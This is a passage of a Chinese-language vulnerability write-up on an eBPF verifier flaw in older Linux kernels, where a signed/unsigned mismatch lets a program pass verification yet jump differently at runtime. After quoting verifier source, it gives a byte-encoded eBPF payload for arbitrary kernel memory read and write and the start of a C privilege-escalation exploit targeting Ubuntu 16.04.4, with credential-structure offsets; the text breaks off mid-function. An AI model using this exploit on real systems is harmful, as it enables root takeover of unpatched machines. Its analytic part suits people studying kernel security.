(!env-&gt;prog-&gt;aux-&gt;used_maps)    /* if we didn&#x27;t copy map pointers into bpf_prog_info, release\t\t * them now. Otherwise free_bpf_prog_info() will release them.\t\t */    release_maps(env);  *prog = env-&gt;prog;  kfree(env);  mutex_unlock(&amp;bpf_verifier_lock);  return ret;&#125;\n\n这里首先是使用check_cfg函数借用了程序控制流图的思路来检查这个EBPF程序中是否有死循环和跳转到未初始化的位置，避免造成无法预期的风险。最后则是使用do_check函数模拟执行一次注入代码，会将注入代码的所有逻辑分支从头到尾都会被完全跑上一遍，会模拟每条指令的执行，包括堆栈、寄存器、访问内存、调用函数等。\n漏洞分析这里的漏洞发生在do_check函数和最后真正运行的__bpf_prog_run翻译结果不一致导致的。这里用如下代码来演示：\nBPF_MOV32_IMM(BPF_REG_9, 0xFFFFFFFF),             /* r9 = (u32)0xFFFFFFFF   */BPF_JMP_IMM(BPF_JNE, BPF_REG_9, 0xFFFFFFFF, 2),   /* if (r9 == -1) &#123;        */BPF_MOV64_IMM(BPF_REG_0, 0),                      /*   exit(0);             */BPF_EXIT_INSN()\n\n首先看一下do_check函数中处理的事情：\ninit_reg_state(regs);insn_idx = 0;for (;;) &#123;\tstruct bpf_insn *insn;\tu8 class;\tint err;\tif (insn_idx &gt;= insn_cnt) &#123;\t\tverbose(&quot;invalid insn idx %d insn_cnt %d\\n&quot;,\t\t\tinsn_idx, insn_cnt);\t\treturn -EFAULT;\t&#125;\tinsn = &amp;insns[insn_idx]; \tclass = BPF_CLASS(insn-&gt;code);  // ...&#125;\n\n可以看到这里存在一个for死循环，最后会返回BPF_CLASS获得的指令操作码类型。\n第一条指令是BPF_MOV32_IMM(BPF_REG_9, 0xFFFFFFFF)，BPF_MOV指令属于ALU大类中，在检测到指令类型是ALU，进入如下分支，调用check_alu_op()函数继续判断。\nif (class == BPF_ALU || class == BPF_ALU64) &#123;\terr = check_alu_op(env, insn);\tif (err)\t\treturn err;&#125;\n\n根据check_alu_op()函数，上面这条代码的指令操作码为BPF_MOV，进入如下分支。\nelse if (opcode == BPF_MOV) &#123;  ......    if (BPF_SRC(insn-&gt;code) == BPF_X) &#123;      if (BPF_CLASS(insn-&gt;code) == BPF_ALU64) &#123;        /* case: R1 = R2\t\t\t\t * copy register state to dest reg\t\t\t\t */        regs[insn-&gt;dst_reg] = regs[insn-&gt;src_reg];      &#125; else &#123;         if (is_pointer_value(env, insn-&gt;src_reg)) &#123;          verbose(&quot;R%d partial copy of pointer\\n&quot;,                  insn-&gt;src_reg);          return -EACCES;        &#125;        regs[insn-&gt;dst_reg].type = UNKNOWN_VALUE;        regs[insn-&gt;dst_reg].map_ptr = NULL;      &#125;    &#125; else &#123; //BPF_K      /* case: R = imm\t\t\t * remember the value we stored into this reg\t\t\t */      regs[insn-&gt;dst_reg].type = CONST_IMM;       regs[insn-&gt;dst_reg].imm = insn-&gt;imm;    &#125;&#125;\n\n可以看到这里最后是将指令的立即数保存到了reg_state结构体中的：\nstruct reg_state &#123;  enum bpf_reg_type type;  union &#123;    /* valid when type == CONST_IMM | PTR_TO_STACK */    int imm;    /* valid when type == CONST_PTR_TO_MAP | PTR_TO_MAP_VALUE |\t\t *   PTR_TO_MAP_VALUE_OR_NULL\t\t */    struct bpf_map *map_ptr;  &#125;;&#125;;\n\n可以看到，这里的imm也是有符号整数，和bpf_insn结构体中的imm类型一致。检查第二条指令BPF_JMP_IMM(BPF_JNE, BPF_REG_9, 0xFFFFFFFF, 2)，这是一条JMP指令，在do_check函数中会进入如下分支：\nelse if (class == BPF_JMP) &#123;  u8 opcode = BPF_OP(insn-&gt;code);  if (opcode == BPF_CALL) &#123;    if (BPF_SRC(insn-&gt;code) != BPF_K ||        insn-&gt;off != 0 ||        insn-&gt;src_reg != BPF_REG_0 ||        insn-&gt;dst_reg != BPF_REG_0) &#123;      verbose(&quot;BPF_CALL uses reserved fields\\n&quot;);      return -EINVAL;    &#125;    err = check_call(env, insn-&gt;imm);    if (err)      return err;  &#125; else if (opcode == BPF_JA) &#123;    if (BPF_SRC(insn-&gt;code) != BPF_K ||        insn-&gt;imm != 0 ||        insn-&gt;src_reg != BPF_REG_0 ||        insn-&gt;dst_reg != BPF_REG_0) &#123;      verbose(&quot;BPF_JA uses reserved fields\\n&quot;);      return -EINVAL;    &#125;    insn_idx += insn-&gt;off + 1;    continue;  &#125; else if (opcode == BPF_EXIT) &#123;    if (BPF_SRC(insn-&gt;code) != BPF_K ||        insn-&gt;imm != 0 ||        insn-&gt;src_reg != BPF_REG_0 ||        insn-&gt;dst_reg != BPF_REG_0) &#123;      verbose(&quot;BPF_EXIT uses reserved fields\\n&quot;);      return -EINVAL;    &#125;    /* eBPF calling convetion is such that R0 is used\t\t\t\t * to return the value from eBPF program.\t\t\t\t * Make sure that it&#x27;s readable at this time\t\t\t\t * of bpf_exit, which means that program wrote\t\t\t\t * something into it earlier\t\t\t\t */    err = check_reg_arg(regs, BPF_REG_0, SRC_OP);    if (err)      return err;    if (is_pointer_value(env, BPF_REG_0)) &#123;      verbose(&quot;R0 leaks addr as return value\\n&quot;);      return -EACCES;    &#125;    process_bpf_exit:    insn_idx = pop_stack(env, &amp;prev_insn_idx);    if (insn_idx &lt; 0) &#123;      break;    &#125; else &#123;      do_print_state = true;      continue;    &#125;  &#125; else &#123;    err = check_cond_jmp_op(env, insn, &amp;insn_idx);    if (err)      return err;  &#125;&#125;\n\n最后的else语句也就是JNE所进入的分支，所以会进一步进入check_cond_jmp_op函数。\nif (BPF_SRC(insn-&gt;code) == BPF_K &amp;&amp;    (opcode == BPF_JEQ || opcode == BPF_JNE) &amp;&amp;    regs[insn-&gt;dst_reg].type == CONST_IMM &amp;&amp;    regs[insn-&gt;dst_reg].imm == insn-&gt;imm) &#123;  if (opcode == BPF_JEQ) &#123;    /* if (imm == imm) goto pc+off;\t\t\t * only follow the goto, ignore fall-through\t\t\t */    *insn_idx += insn-&gt;off;    return 0;  &#125; else &#123;    /* if (imm != imm) goto pc+off;\t\t\t * only follow fall-through branch, since\t\t\t * that&#x27;s where the program will go\t\t\t */    return 0;  &#125;&#125;\n\n在函数内部存在这样一条if语句，由前面提到了在reg_state结构体中的imm和insn中的imm都是int类型，并且reg_state结构体中的imm是由insn中直接赋值过去的，所以这个条件会恒等。所以当操作码为BPF_JNE时，永远都不会跳转。\n上面是模拟执行的情况，那么下面看看真实执行情况是什么样子的，首先真实执行情况的函数为__bpf_prog_run:\nstatic unsigned int __bpf_prog_run(void *ctx, const struct bpf_insn *insn)&#123;\tu64 stack[MAX_BPF_STACK / sizeof(u64)];\tu64 regs[MAX_BPF_REG], tmp;\tstatic const void *jumptable[256] = &#123;\t\t[0 ... 255] = &amp;&amp;default_label,\t\t/* Now overwrite non-defaults ... */\t\t/* 32 bit ALU operations */\t\t[BPF_ALU | BPF_ADD | BPF_X] = &amp;&amp;ALU_ADD_X,\t\t[BPF_ALU | BPF_ADD | BPF_K] = &amp;&amp;ALU_ADD_K,\t\t[BPF_ALU | BPF_SUB | BPF_X] = &amp;&amp;ALU_SUB_X,\t\t[BPF_ALU | BPF_SUB | BPF_K] = &amp;&amp;ALU_SUB_K,\t\t[BPF_ALU | BPF_AND | BPF_X] = &amp;&amp;ALU_AND_X,\t\t[BPF_ALU | BPF_AND | BPF_K] = &amp;&amp;ALU_AND_K,\t\t[BPF_ALU | BPF_OR | BPF_X]  = &amp;&amp;ALU_OR_X,\t\t[BPF_ALU | BPF_OR | BPF_K]  = &amp;&amp;ALU_OR_K,\t\t[BPF_ALU | BPF_LSH | BPF_X] = &amp;&amp;ALU_LSH_X,\t\t[BPF_ALU | BPF_LSH | BPF_K] = &amp;&amp;ALU_LSH_K,\t\t[BPF_ALU | BPF_RSH | BPF_X] = &amp;&amp;ALU_RSH_X,\t\t[BPF_ALU | BPF_RSH | BPF_K] = &amp;&amp;ALU_RSH_K,\t\t[BPF_ALU | BPF_XOR | BPF_X] = &amp;&amp;ALU_XOR_X,    // ...  &#125;\n\n可以看到函数这里维护的是一个跳表，根据opcode来进行跳转，并且没有任何检测。这里重点关注一下上述例子中的跳转函数：\n/* Jumps */[BPF_JMP | BPF_JA] = &amp;&amp;JMP_JA,[BPF_JMP | BPF_JEQ | BPF_X] = &amp;&amp;JMP_JEQ_X,[BPF_JMP | BPF_JEQ | BPF_K] = &amp;&amp;JMP_JEQ_K,[BPF_JMP | BPF_JNE | BPF_X] = &amp;&amp;JMP_JNE_X,[BPF_JMP | BPF_JNE | BPF_K] = &amp;&amp;JMP_JNE_K,[BPF_JMP | BPF_JGT | BPF_X] = &amp;&amp;JMP_JGT_X,[BPF_JMP | BPF_JGT | BPF_K] = &amp;&amp;JMP_JGT_K,[BPF_JMP | BPF_JGE | BPF_X] = &amp;&amp;JMP_JGE_X,[BPF_JMP | BPF_JGE | BPF_K] = &amp;&amp;JMP_JGE_K,[BPF_JMP | BPF_JSGT | BPF_X] = &amp;&amp;JMP_JSGT_X,[BPF_JMP | BPF_JSGT | BPF_K] = &amp;&amp;JMP_JSGT_K,[BPF_JMP | BPF_JSGE | BPF_X] = &amp;&amp;JMP_JSGE_X,[BPF_JMP | BPF_JSGE | BPF_K] = &amp;&amp;JMP_JSGE_K,[BPF_JMP | BPF_JSET | BPF_X] = &amp;&amp;JMP_JSET_X,[BPF_JMP | BPF_JSET | BPF_K] = &amp;&amp;JMP_JSET_K,\n\n可以看到这里赋值的是JMP_JNE_K：\nJMP_JNE_K:if (DST != IMM) &#123;  insn += insn-&gt;off;  CONT_JMP;&#125;CONT;\n\n这里就比较关注DST和IMM的定义了：\n/* Named registers */#define DST\tregs[insn-&gt;dst_reg]#define SRC\tregs[insn-&gt;src_reg]#define FP\tregs[BPF_REG_FP]#define ARG1\tregs[BPF_REG_ARG1]#define CTX\tregs[BPF_REG_CTX]#define IMM\tinsn-&gt;imm\n\n可以看到这里IMM的定义依旧是从insn中拿出来的，然而这里的DST是直接从约定的寄存器中拿出来，然而在__bpf_prog_run函数的开头可以看出来这里的寄存器定义为unsigned long long int类型，那么如果重新执行上述演示代码就会出现跳转，也就是说检查和实际运行的指令执行流程会不一致，可以利用这个绕过安全检测。\n漏洞利用退出do_check但就目前来看依旧存在的一个问题就是虽然他会进入BPF_EXIT分支，但是在最后的pop_stack需要返回的值为负数才能结束循环退出do_check函数。\nelse if (opcode == BPF_EXIT) &#123;  if (BPF_SRC(insn-&gt;code) != BPF_K ||      insn-&gt;imm != 0 ||      insn-&gt;src_reg != BPF_REG_0 ||      insn-&gt;dst_reg != BPF_REG_0) &#123;    verbose(&quot;BPF_EXIT uses reserved fields\\n&quot;);    return -EINVAL;  &#125;  /* eBPF calling convetion is such that R0 is used\t\t\t\t * to return the value from eBPF program.\t\t\t\t * Make sure that it&#x27;s readable at this time\t\t\t\t * of bpf_exit, which means that program wrote\t\t\t\t * something into it earlier\t\t\t\t */  err = check_reg_arg(regs, BPF_REG_0, SRC_OP);  if (err)    return err;  if (is_pointer_value(env, BPF_REG_0)) &#123;    verbose(&quot;R0 leaks addr as return value\\n&quot;);    return -EACCES;  &#125;  process_bpf_exit:  insn_idx = pop_stack(env, &amp;prev_insn_idx);  if (insn_idx &lt; 0) &#123;    break;  &#125; else &#123;    do_print_state = true;    continue;  &#125;\n\nstatic int pop_stack(struct verifier_env *env, int *prev_insn_idx)&#123;\tstruct verifier_stack_elem *elem;\tint insn_idx;\tif (env-&gt;head == NULL)\t\treturn -1;\tmemcpy(&amp;env-&gt;cur_state, &amp;env-&gt;head-&gt;st, sizeof(env-&gt;cur_state));\tinsn_idx = env-&gt;head-&gt;insn_idx;\tif (prev_insn_idx)\t\t*prev_insn_idx = env-&gt;head-&gt;prev_insn_idx;\telem = env-&gt;head-&gt;next;\tkfree(env-&gt;head);\tenv-&gt;head = elem;\tenv-&gt;stack_size--;\treturn insn_idx;&#125;\n\nstruct verifier_env &#123;\tstruct bpf_prog *prog;\t\t/* eBPF program being verified */\tstruct verifier_stack_elem *head; /* stack of verifier states to be processed */\tint stack_size;\t\t\t/* number of states to be processed */\tstruct verifier_state cur_state; /* current verifier state */\tstruct verifier_state_list **explored_states; /* search pruning optimization */\tstruct bpf_map *used_maps[MAX_USED_MAPS]; /* array of map&#x27;s used by eBPF program */\tu32 used_map_cnt;\t\t/* number of used maps */\tbool allow_ptr_leaks;&#125;;\n\n所以我们在实现构造时需要将head位置为0，根据函数名pop_stack可以推测出来这里其实也就是栈的操作，所以大致的构造方法是：\nBPF_MOV32_IMM(BPF_REG_9, 0xFFFFFFFF),             /* r9 = (u32)0xFFFFFFFF   */BPF_JMP_IMM(BPF_JNE, BPF_REG_9, 0xFFFFFFFF, 2),   /* if (r9 == -1) &#123;        */BPF_MOV64_IMM(BPF_REG_0, 0),                      /*   exit(0);             */BPF_EXIT_INSN(),option,pandding == 0,options\n\n实现任意地址读写内存读写需要用到的指令主要是BPF_LDX_MEM或者BPF_STX_MEM两类。如下，当r7和r8的值可控就可以达到内存任意写，类似于mov dword ptr[r7],r8这样的操作。\nelse if (class == BPF_LDX) &#123;  enum bpf_reg_type src_reg_type;  /* check for reserved fields is already done */  /* check src operand */  err = check_reg_arg(regs, insn-&gt;src_reg, SRC_OP);  if (err)    return err;  err = check_reg_arg(regs, insn-&gt;dst_reg, DST_OP_NO_MARK);  if (err)    return err;  src_reg_type = regs[insn-&gt;src_reg].type;  /* check that memory (src_reg + off) is readable,\t\t\t * the state of dst_reg will be updated by this func\t\t\t */  err = check_mem_access(env, insn-&gt;src_reg, insn-&gt;off,                         BPF_SIZE(insn-&gt;code), BPF_READ,                         insn-&gt;dst_reg);  if (err)    return err;  if (BPF_SIZE(insn-&gt;code) != BPF_W) &#123;    insn_idx++;    continue;  &#125;  if (insn-&gt;imm == 0) &#123;    /* saw a valid insn\t\t\t\t * dst_reg = *(u32 *)(src_reg + off)\t\t\t\t * use reserved &#x27;imm&#x27; field to mark this insn\t\t\t\t */    insn-&gt;imm = src_reg_type;  &#125; else if (src_reg_type != insn-&gt;imm &amp;&amp;             (src_reg_type == PTR_TO_CTX ||              insn-&gt;imm == PTR_TO_CTX)) &#123;    /* ABuser program is trying to use the same insn\t\t\t\t * dst_reg = *(u32*) (src_reg + off)\t\t\t\t * with different pointer types:\t\t\t\t * src_reg == ctx in one branch and\t\t\t\t * src_reg == stack|map in some other branch.\t\t\t\t * Reject it.\t\t\t\t */    verbose(&quot;same insn cannot be used with different pointers\\n&quot;);    return -EINVAL;  &#125;&#125; else if (class == BPF_STX) &#123;  enum bpf_reg_type dst_reg_type;  if (BPF_MODE(insn-&gt;code) == BPF_XADD) &#123;    err = check_xadd(env, insn);    if (err)      return err;    insn_idx++;    continue;  &#125;  /* check src1 operand */  err = check_reg_arg(regs, insn-&gt;src_reg, SRC_OP);  if (err)    return err;  /* check src2 operand */  err = check_reg_arg(regs, insn-&gt;dst_reg, SRC_OP);  if (err)    return err;  dst_reg_type = regs[insn-&gt;dst_reg].type;  /* check that memory (dst_reg + off) is writeable */  err = check_mem_access(env, insn-&gt;dst_reg, insn-&gt;off,                         BPF_SIZE(insn-&gt;code), BPF_WRITE,                         insn-&gt;src_reg);  if (err)    return err;  if (insn-&gt;imm == 0) &#123;    insn-&gt;imm = dst_reg_type;  &#125; else if (dst_reg_type != insn-&gt;imm &amp;&amp;             (dst_reg_type == PTR_TO_CTX ||              insn-&gt;imm == PTR_TO_CTX)) &#123;    verbose(&quot;same insn cannot be used with different pointers\\n&quot;);    return -EINVAL;  &#125;&#125;\n\ncheck_mem_access函数会根据读写类型检查dst或src的值是否为栈指针、数据包指针、map指针，否则不允许读写。所以这里使用BPF_FUNC_map_lookup_elem这样的函数调用返回，再赋给某个寄存器，然后再进行读写。\n最终构造的eBPF指令为：\n----------------------------------------------part 1 ----------------------------------------------1. &quot;\\xb4\\x09\\x00\\x00\\xff\\xff\\xff\\xff&quot;  /* BPF_MOV32_IMM(BPF_REG_9, 0xFFFFFFFF),              r9 = (u32)0xFFFFFFFF   */2. &quot;\\x55\\x09\\x02\\x00\\xff\\xff\\xff\\xff&quot;  /*BPF_JMP_IMM(BPF_JNE, BPF_REG_9, 0xFFFFFFFF, 2),    if (r9 == -1) &#123;        */3. &quot;\\xb7\\x00\\x00\\x00\\x00\\x00\\x00\\x00&quot;  /*BPF_MOV64_IMM(BPF_REG_0, 0),                         exit(0);             */4. &quot;\\x95\\x00\\x00\\x00\\x00\\x00\\x00\\x00&quot;  /*BPF_EXIT_INSN()                                                            */----------------------------------------------part 2 ----------------------------------------------5. &quot;\\x18\\x19\\x00\\x00\\x03\\x00\\x00\\x00&quot;  /*BPF_LD_MAP_FD(BPF_REG_9, mapfd),                 /* r9=mapfd               */6. &quot;\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00&quot;----------------------------------------------part 3 ----------------------------------------------/** BPF_MAP_GET(0, BPF_REG_6)  r6=op，取map中Key值为0的value值存放到reg_6* */10. &quot;\\xbf\\x91\\x00\\x00\\x00\\x00\\x00\\x00&quot;  /*BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),              /* r1 = r9                */11. &quot;\\xbf\\xa2\\x00\\x00\\x00\\x00\\x00\\x00&quot;  /*BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),             /* r2 = fp                */12. &quot;\\x07\\x02\\x00\\x00\\xfc\\xff\\xff\\xff&quot;  /*BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),            /* r2 = fp - 4            */13. &quot;\\x62\\x0a\\xfc\\xff\\x00\\x00\\x00\\x00&quot;  /*BPF_ST_MEM(BPF_W, BPF_REG_10, -4, idx=0),           /* *(u32 *)(fp - 4) = 0 */14. &quot;\\x85\\x00\\x00\\x00\\x01\\x00\\x00\\x00&quot;  /*BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),           */15. &quot;\\x55\\x00\\x01\\x00\\x00\\x00\\x00\\x00&quot;  /*BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),            /* if (r0 == 0)           */16. &quot;\\x95\\x00\\x00\\x00\\x00\\x00\\x00\\x00&quot;  /*BPF_EXIT_INSN(),                                  /*   exit(0);             */17. &quot;\\x79\\x06\\x00\\x00\\x00\\x00\\x00\\x00&quot;  /*BPF_LDX_MEM(BPF_DW, (r6), BPF_REG_0, 0)          /* r_dst = *(u64 *)(r0)   */----------------------------------------------part 4 ----------------------------------------------/** BPF_MAP_GET(1, BPF_REG_7)  r7=address,取map中Key值为1的value值存放到reg_7* */21. &quot;\\xbf\\x91\\x00\\x00\\x00\\x00\\x00\\x00&quot;  /*BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),              /* r1 = r9                */22. &quot;\\xbf\\xa2\\x00\\x00\\x00\\x00\\x00\\x00&quot;  /*BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),             /* r2 = fp                */23. &quot;\\x07\\x02\\x00\\x00\\xfc\\xff\\xff\\xff&quot;  /*BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),            /* r2 = fp - 4            */24. &quot;\\x62\\x0a\\xfc\\xff\\x01\\x00\\x00\\x00&quot;  /*BPF_ST_MEM(BPF_W, BPF_REG_10, -4, idx=1),           /* *(u32 *)(fp - 4) = 1 */25. &quot;\\x85\\x00\\x00\\x00\\x01\\x00\\x00\\x00&quot;  /*BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),          */26. &quot;\\x55\\x00\\x01\\x00\\x00\\x00\\x00\\x00&quot;  /*BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),            /* if (r0 == 0)           */27. &quot;\\x95\\x00\\x00\\x00\\x00\\x00\\x00\\x00&quot;  /*BPF_EXIT_INSN(),                                  /*   exit(0);             */28. &quot;\\x79\\x07\\x00\\x00\\x00\\x00\\x00\\x00&quot;  /*BPF_LDX_MEM(BPF_DW, (r7), BPF_REG_0, 0)          /* r_dst = *(u64 *)(r0)   */----------------------------------------------part 5 ----------------------------------------------/** BPF_MAP_GET(2, BPF_REG_8)  r8=value，取map中Key值为2的value值存放到reg_8* */32. &quot;\\xbf\\x91\\x00\\x00\\x00\\x00\\x00\\x00&quot;  /*BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),              /* r1 = r9                */33. &quot;\\xbf\\xa2\\x00\\x00\\x00\\x00\\x00\\x00&quot;  /*BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),             /* r2 = fp                */34. &quot;\\x07\\x02\\x00\\x00\\xfc\\xff\\xff\\xff&quot;  /*BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),            /* r2 = fp - 4            */35. &quot;\\x62\\x0a\\xfc\\xff\\x02\\x00\\x00\\x00&quot;  /*BPF_ST_MEM(BPF_W, BPF_REG_10, -4, idx=2),           /* *(u32 *)(fp - 4) = 2 */36. &quot;\\x85\\x00\\x00\\x00\\x01\\x00\\x00\\x00&quot;  //BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),37. &quot;\\x55\\x00\\x01\\x00\\x00\\x00\\x00\\x00&quot;  /*BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),            /* if (r0 == 0)           */38. &quot;\\x95\\x00\\x00\\x00\\x00\\x00\\x00\\x00&quot;  /*BPF_EXIT_INSN(),                                  /*   exit(0);             */39. &quot;\\x79\\x08\\x00\\x00\\x00\\x00\\x00\\x00&quot;  /*BPF_LDX_MEM(BPF_DW, (r8), BPF_REG_0, 0)          /* r_dst = *(u64 *)(r0)   */----------------------------------------------part 6 ----------------------------------------------1. &quot;\\xbf\\x02\\x00\\x00\\x00\\x00\\x00\\x00&quot;  /*BPF_MOV64_REG(BPF_REG_2, BPF_REG_0),               /* r2 = r0    此时r2和r0都指向map中key=2的元素           */2. &quot;\\xb7\\x00\\x00\\x00\\x00\\x00\\x00\\x00&quot;  /*BPF_MOV64_IMM(BPF_REG_0, 0),                       /* r0 = 0  for exit(0)   */3. &quot;\\x55\\x06\\x03\\x00\\x00\\x00\\x00\\x00&quot;  /*BPF_JMP_IMM(BPF_JNE, BPF_REG_6, 0, 3),             /* if (op == 0)          */4. &quot;\\x79\\x73\\x00\\x00\\x00\\x00\\x00\\x00&quot;  //BPF_LDX_MEM(BPF_DW, BPF_REG_3, BPF_REG_7, 0), 读取BPF_REG_7地址的内容放到BPF_REG_35. &quot;\\x7b\\x32\\x00\\x00\\x00\\x00\\x00\\x00&quot;  //BPF_STX_MEM(BPF_DW, BPF_REG_2, BPF_REG_3, 0),将BPF_REG_3的内容放入到BPF_REG_26. &quot;\\x95\\x00\\x00\\x00\\x00\\x00\\x00\\x00&quot;  //BPF_EXIT_INSN(),7. &quot;\\x55\\x06\\x02\\x00\\x01\\x00\\x00\\x00&quot;  //BPF_JMP_IMM(BPF_JNE, BPF_REG_6, 1, 2),       if(op != 1 )JMP insn+28. &quot;\\x7b\\xa2\\x00\\x00\\x00\\x00\\x00\\x00&quot;  //BPF_STX_MEM(BPF_DW, BPF_REG_2, BPF_REG_10, 0), when op == 1 将rbp寄存器的值即fp指针放到BPF_REG_29. &quot;\\x95\\x00\\x00\\x00\\x00\\x00\\x00\\x00&quot;  //BPF_EXIT_INSN(),                                  /*   exit(0);             */10. &quot;\\x7b\\x87\\x00\\x00\\x00\\x00\\x00\\x00&quot;  //BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_8, 0), when op == 2 往BPF_REG_7的地址写入BPF_REG_811. &quot;\\x95\\x00\\x00\\x00\\x00\\x00\\x00\\x00&quot;  //BPF_EXIT_INSN(),\n\n综上，exp/* * Ubuntu 16.04.4 kernel priv esc * * all credits to @bleidl * - vnik */// Tested on:// 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64// if different kernel adjust CRED offset + check kernel stack size#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;errno.h&gt;#include &lt;fcntl.h&gt;#include &lt;string.h&gt;#include &lt;linux/bpf.h&gt;#include &lt;linux/unistd.h&gt;#include &lt;sys/mman.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/socket.h&gt;#include &lt;sys/un.h&gt;#include &lt;sys/stat.h&gt;#include &lt;stdint.h&gt;#define PHYS_OFFSET 0xffff880000000000#define CRED_OFFSET 0x9b8 // 0x5f8#define UID_OFFSET 4#define LOG_BUF_SIZE 65536#define PROGSIZE 328 //-32int sockets[2];int mapfd, progfd;char *__prog = &quot;\\xb4\\x09\\x00\\x00\\xff\\xff\\xff\\xff&quot;\t\t\t   &quot;\\x55\\x09\\x02\\x00\\xff\\xff\\xff\\xff&quot;\t\t\t   &quot;\\xb7\\x00\\x00\\x00\\x00\\x00\\x00\\x00&quot;\t\t\t   &quot;\\x95\\x00\\x00\\x00\\x00\\x00\\x00\\x00&quot;\t\t\t   &quot;\\x18\\x19\\x00\\x00\\x03\\x00\\x00\\x00&quot;\t\t\t   &quot;\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00&quot;\t\t\t   &quot;\\xbf\\x91\\x00\\x00\\x00\\x00\\x00\\x00&quot;\t\t\t   &quot;\\xbf\\xa2\\x00\\x00\\x00\\x00\\x00\\x00&quot;\t\t\t   &quot;\\x07\\x02\\x00\\x00\\xfc\\xff\\xff\\xff&quot;\t\t\t   &quot;\\x62\\x0a\\xfc\\xff\\x00\\x00\\x00\\x00&quot;\t\t\t   &quot;\\x85\\x00\\x00\\x00\\x01\\x00\\x00\\x00&quot;\t\t\t   &quot;\\x55\\x00\\x01\\x00\\x00\\x00\\x00\\x00&quot;\t\t\t   &quot;\\x95\\x00\\x00\\x00\\x00\\x00\\x00\\x00&quot;\t\t\t   &quot;\\x79\\x06\\x00\\x00\\x00\\x00\\x00\\x00&quot;\t\t\t   &quot;\\xbf\\x91\\x00\\x00\\x00\\x00\\x00\\x00&quot;\t\t\t   &quot;\\xbf\\xa2\\x00\\x00\\x00\\x00\\x00\\x00&quot;\t\t\t   &quot;\\x07\\x02\\x00\\x00\\xfc\\xff\\xff\\xff&quot;\t\t\t   &quot;\\x62\\x0a\\xfc\\xff\\x01\\x00\\x00\\x00&quot;\t\t\t   &quot;\\x85\\x00\\x00\\x00\\x01\\x00\\x00\\x00&quot;\t\t\t   &quot;\\x55\\x00\\x01\\x00\\x00\\x00\\x00\\x00&quot;\t\t\t   &quot;\\x95\\x00\\x00\\x00\\x00\\x00\\x00\\x00&quot;\t\t\t   &quot;\\x79\\x07\\x00\\x00\\x00\\x00\\x00\\x00&quot;\t\t\t   &quot;\\xbf\\x91\\x00\\x00\\x00\\x00\\x00\\x00&quot;\t\t\t   &quot;\\xbf\\xa2\\x00\\x00\\x00\\x00\\x00\\x00&quot;\t\t\t   &quot;\\x07\\x02\\x00\\x00\\xfc\\xff\\xff\\xff&quot;\t\t\t   &quot;\\x62\\x0a\\xfc\\xff\\x02\\x00\\x00\\x00&quot;\t\t\t   &quot;\\x85\\x00\\x00\\x00\\x01\\x00\\x00\\x00&quot;\t\t\t   &quot;\\x55\\x00\\x01\\x00\\x00\\x00\\x00\\x00&quot;\t\t\t   &quot;\\x95\\x00\\x00\\x00\\x00\\x00\\x00\\x00&quot;\t\t\t   &quot;\\x79\\x08\\x00\\x00\\x00\\x00\\x00\\x00&quot;\t\t\t   &quot;\\xbf\\x02\\x00\\x00\\x00\\x00\\x00\\x00&quot;\t\t\t   &quot;\\xb7\\x00\\x00\\x00\\x00\\x00\\x00\\x00&quot;\t\t\t   &quot;\\x55\\x06\\x03\\x00\\x00\\x00\\x00\\x00&quot;\t\t\t   &quot;\\x79\\x73\\x00\\x00\\x00\\x00\\x00\\x00&quot;\t\t\t   &quot;\\x7b\\x32\\x00\\x00\\x00\\x00\\x00\\x00&quot;\t\t\t   &quot;\\x95\\x00\\x00\\x00\\x00\\x00\\x00\\x00&quot;\t\t\t   &quot;\\x55\\x06\\x02\\x00\\x01\\x00\\x00\\x00&quot;\t\t\t   &quot;\\x7b\\xa2\\x00\\x00\\x00\\x00\\x00\\x00&quot;\t\t\t   &quot;\\x95\\x00\\x00\\x00\\x00\\x00\\x00\\x00&quot;\t\t\t   &quot;\\x7b\\x87\\x00\\x00\\x00\\x00\\x00\\x00&quot;\t\t\t   &quot;\\x95\\x00\\x00\\x00\\x00\\x00\\x00\\x00&quot;;char bpf_log_buf[LOG_BUF_SIZE];static int bpf_prog_load(enum bpf_prog_type prog_type,\t\t\t\t\t\t const struct bpf_insn *insns, int prog_len,\t\t\t\t\t\t const char *license, int kern_version)&#123;\tunion bpf_attr attr = &#123;\t\t.prog_type = prog_type,\t\t.insns = (__u64)insns,\t\t.insn_cnt = prog_len / sizeof(struct bpf_insn),\t\t.license = (__u64)license,\t\t.log_buf = (__u64)bpf_log_buf,\t\t.log_size = LOG_BUF_SIZE,\t\t.log_level = 1,\t&#125;;\tattr.kern_version = kern_version;\tbpf_log_buf[0] = 0;\treturn syscall(__NR_bpf, BPF_PROG_LOAD, &amp;attr, sizeof(attr));&#125;static int bpf_create_map(enum bpf_map_type map_type, int key_size, int value_size,\t\t\t\t\t\t  int max_entries)&#123;\tunion bpf_attr attr = &#123;\t\t.map_type = map_type,\t\t.key_size = key_size,\t\t.value_size = value_size,\t\t.max_entries = max_entries&#125;;\treturn syscall(__NR_bpf, BPF_MAP_CREATE, &amp;attr, sizeof(attr));&#125;static int bpf_update_elem(uint64_t key, uint64_t value)&#123;\tunion bpf_attr attr = &#123;\t\t.map_fd = mapfd,\t\t.key = (__u64)&amp;key,\t\t.value = (__u64)&amp;value,\t\t.flags = 0,\t&#125;;\treturn syscall(__NR_bpf, 